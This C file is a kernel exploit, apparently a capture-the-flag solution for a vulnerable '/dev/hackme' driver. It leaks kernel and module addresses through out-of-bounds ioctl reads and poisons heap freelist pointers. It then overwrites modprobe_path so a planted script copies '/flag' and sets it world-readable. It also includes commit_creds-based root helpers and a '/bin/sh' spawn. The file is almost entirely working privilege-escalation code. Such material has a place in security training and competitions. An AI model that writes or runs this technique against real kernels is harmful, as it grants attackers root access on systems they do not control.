#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr = 0xffffffff810a1420;
size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
void* fake_tty_opera[30];
int fd=-1;
char buf[0x100];
void shell(){
    system("/bin/sh");
}
 
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}
 
void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
void delete(size_t idx){
    size_t data[2] = {idx,0};
	ioctl(fd,0x30001,data);
}
void edit(size_t idx,size_t source,size_t size,size_t target){
	size_t data[4] = {idx,source,size,target};
	ioctl(fd,0x30002,data);
}
void show(size_t idx,size_t source,size_t size,size_t target){
        size_t data[4] = {idx,source,size,target};
        ioctl(fd,0x30003,data);
}
void add(size_t idx,size_t source,size_t size){
        size_t data[3] = {idx,source,size};
        ioctl(fd,0x30000,data);
}
int main(){
    fd = open("/dev/hackme",0);
    if(fd < 0){
        printf("[*]OPEN KO ERROR!\n");
        exit(0);
    }
    memset(buf,'A',0x100);
    add(0,buf,0x100);
    add(1,buf,0x100);
    add(2,buf,0x100);
    add(3,buf,0x100);
    show(0,buf,0x300,-0x300);
    size_t kernel_base = *((size_t*)buf) - 0x8472c0;
    printf("[*]kernel base = 0x%llx\n",kernel_base);
    size_t mod_tree = kernel_base+0x811000;
    printf("[*]mod_tree = 0x%llx\n",mod_tree);
    
    delete(0);
    size_t *ptr=buf;
    memset(buf,0,0x100);
    *ptr = mod_tree+0x30;
    edit(1,buf,0x100,-0x100);//change fd to mod_tree
    add(4,buf,0x100);
    add(5,buf,0x100);//mod_tree
    memset(buf,0,0x10);
    show(5,buf,0x20,-0x20);
    size_t ko = *(ptr+1);
    printf("[*]ko = 0x%llx\n",ko);
    size_t pool = ko+0x2400;
    printf("[*]pool = 0x%llx\n",pool);
    
    delete(1);
    memset(buf,0,0x100);
    *ptr = pool+0x70;
    edit(2,buf,0x100,-0x100);//change fd to pool bss
    add(0,buf,0x100);
    add(1,buf,0x100);//pool
    show(1,buf,0x70,-0x70);
    size_t heap = *((size_t*)buf);
    printf("[*]heap = 0x%llx\n",heap);
    
    size_t modprobe_path = kernel_base + 0x663f960-0x5e00000;
    printf("[*]modprobe_path = 0x%llx\n",modprobe_path);
    *ptr = modprobe_path;
    edit(1,buf,0x70,-0x70);//change lst to modprobe_path
    memcpy(buf,"/home/pwn/shell.sh\0",19);
    edit(0,buf,19,0);
    
    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/shell.sh");
    system("chmod +x shell.sh");
    system("echo '、' > leo");
    system("chmod +x leo");
    system("/home/pwn/leo");
    //system("cat /home/pwn/flag");
    return 0;
}
